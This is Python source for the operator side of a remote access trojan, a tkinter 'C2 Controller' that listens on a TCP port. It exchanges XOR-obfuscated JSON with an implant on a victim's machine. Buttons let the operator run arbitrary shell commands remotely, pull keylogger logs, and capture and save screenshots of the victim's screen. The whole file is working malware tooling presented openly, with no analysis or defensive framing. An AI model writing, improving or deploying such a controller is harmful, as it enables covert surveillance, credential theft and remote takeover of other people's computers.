import socket
import json
import threading
import base64
import os
import tkinter as tk
from tkinter import scrolledtext
from PIL import Image, ImageTk
import io
import time

# --- Connection Settings ---
LISTEN_IP = "0.0.0.0"
LISTEN_PORT = 8080

# Pre-shared 8-bit XOR key for payload obfuscation (must match client key)
KEY = b'simple_xor_key'


def xor_crypt(data: bytes) -> bytes:
    """
    Applies symmetric XOR encryption/decryption using a repeating key pattern.
    """
    return bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(data))


class ServerGUI:
    """
    Graphical User Interface (GUI) controller for the C2 server.
    Manages socket connections, payload serialization, and displays exfiltrated data.
    """
    def __init__(self, root):
        self.root = root
        self.root.title("Tactical Shadow RAT - C2 Controller")
        self.client_sock = None

        # Console window for execution output and status logs
        self.output_area = scrolledtext.ScrolledText(root, width=80, height=20, bg="black", fg="green")
        self.output_area.pack(pady=10)

        # Command input field
        self.cmd_entry = tk.Entry(root, width=60)
        self.cmd_entry.pack(side=tk.LEFT, padx=10)
        self.cmd_entry.bind("<Return>", lambda e: self.send_custom_command())

        # Quick action control panel
        btn_frame = tk.Frame(root)
        btn_frame.pack(pady=10)

        tk.Button(btn_frame, text="Screenshot", command=self.request_screenshot, bg="blue", fg="white").pack(side=tk.LEFT, padx=5)
        tk.Button(btn_frame, text="Keylogger Logs", command=self.request_keylog, bg="orange").pack(side=tk.LEFT, padx=5)
        tk.Button(btn_frame, text="Get Hash (logs.txt)", command=self.request_hash, bg="purple", fg="white").pack(side=tk.LEFT, padx=5)
        tk.Button(btn_frame, text="TERMINATE", command=self.terminate_client, bg="red", fg="white").pack(side=tk.LEFT, padx=5)

        # Start listener thread in background
        threading.Thread(target=self.start_server, daemon=True).start()

    def log(self, message: str):
        """Thread-safe UI status logging."""
        self.root.after(0, self._log_main_thread, message)

    def _log_main_thread(self, message: str):
        self.output_area.insert(tk.END, message + "\n")
        self.output_area.see(tk.END)

    def send_msg(self, obj: dict):
        """Serializes payload to JSON, encrypts via XOR, and sends with a 4-byte length prefix."""
        if self.client_sock:
            try:
                raw = json.dumps(obj).encode('utf-8')
                enc = xor_crypt(raw)
                length = len(enc).to_bytes(4, 'big')
                self.client_sock.sendall(length + enc)
            except Exception as e:
                self.log(f"[-] Error sending message: {e}")

    def recv_msg(self) -> dict:
        """Reads length prefix, fetches binary payload, decrypts XOR, and parses JSON."""
        length_bytes = self.client_sock.recv(4)
        if not length_bytes:
            return None
        length = int.from_bytes(length_bytes, 'big')
        data = b''
        while len(data) < length:
            chunk = self.client_sock.recv(length - len(data))
            if not chunk:
                return None
            data += chunk
        dec = xor_crypt(data)
        return json.loads(dec.decode('utf-8', errors='replace'))

    def send_custom_command(self):
        """Sends arbitrary shell command from entry widget."""
        cmd = self.cmd_entry.get()
        if cmd:
            self.send_msg({"action": cmd})
            self.cmd_entry.delete(0, tk.END)

    def request_screenshot(self):
        """Triggers screenshot capture on target host."""
        self.send_msg({"action": "screencap"})

    def request_keylog(self):
        """Retrieves accumulated keystrokes from target host."""
        self.send_msg({"action": "keylog"})

    def request_hash(self):
        """Requests SHA-256 calculation for log file."""
        self.send_msg({"action": "hash", "filename": "logs.txt"})

    def terminate_client(self):
        """Sends graceful termination instruction to target agent."""
        self.send_msg({"action": "terminate"})

    def display_and_save_image(self, b64_data: str):
        """Thread-safe trigger for rendering and saving exfiltrated screenshots."""
        self.root.after(0, self._process_image_main_thread, b64_data)

    def _process_image_main_thread(self, b64_data: str):
        """
        Saves incoming screenshot to local storage and displays it in a compact 
        pop-up GUI window optimal for social media demonstrations (LinkedIn).
        """
        try:
            raw_data = base64.b64decode(b64_data)
            if not os.path.exists("screenshots"):
                os.makedirs("screenshots")

            filename = f"screenshots/screenshot_{int(time.time())}.jpg"
            with open(filename, "wb") as f:
                f.write(raw_data)
            self.log(f"[+] Screenshot saved to: {filename}")

            # Load image into PIL
            img = Image.open(io.BytesIO(raw_data))

            # Scaled down to a compact presentation size (800x450)
            img.thumbnail((800, 450))

            top = tk.Toplevel(self.root)
            top.title(f"Victim Screenshot - {os.path.basename(filename)}")
            top.resizable(False, False)  # Keeps window tightly fitted to image dimensions

            img_tk = ImageTk.PhotoImage(img)
            label = tk.Label(top, image=img_tk)
            label.image = img_tk  # Keep explicit reference to prevent garbage collection
            label.pack(padx=10, pady=10)

        except Exception as e:
            self.log(f"[-] Failed to process image: {e}")

    def start_server(self):
        """Initializes TCP socket server and handles incoming client connection lifecycle."""
        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_sock.bind((LISTEN_IP, LISTEN_PORT))
        server_sock.listen(1)
        self.log(f"[*] Server listening on port {LISTEN_PORT}...")

        while True:
            self.client_sock, addr = server_sock.accept()
            self.log(f"[+] Connection established from {addr}")

            while True:
                msg = self.recv_msg()
                if not msg:
                    self.log("[-] Client disconnected.")
                    break

                if "result" in msg:
                    self.log(f"[Victim Output]: {msg['result']}")

                if "data" in msg:
                    self.display_and_save_image(msg["data"])

            self.client_sock.close()
            self.client_sock = None


if __name__ == "__main__":
    root = tk.Tk()
    app = ServerGUI(root)
    root.mainloop()
